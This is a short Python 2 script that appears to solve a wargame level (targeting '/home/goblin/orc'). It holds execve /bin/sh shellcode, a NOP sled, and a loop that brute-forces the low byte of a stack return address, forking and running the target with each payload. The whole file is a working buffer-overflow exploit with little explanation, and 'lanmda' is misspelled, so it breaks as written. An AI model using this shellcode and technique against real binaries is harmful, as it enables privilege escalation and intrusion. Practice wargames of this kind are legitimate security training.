import os
from struct import *

p = lambda x: pack("<L", x)
up = lanmda x : unpack("<L", x)[0]

target = "/home/goblin/orc"
ret = 0xbffffc30
limit = 44

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

for i in range(0xff, 0 , -1):
    payload = shellcode + "\x90"*(limit-len(shellcode))+chr(i)+"\xfc\xff\xbf"
    pid = os.fork()

    if pid == 0:
        print hex(up(chr(i)+ "\xfc\xff\xbf"))
        os.execv(target,[target, payload])

    else:
        os.waitpid(pid,0) # wait for child process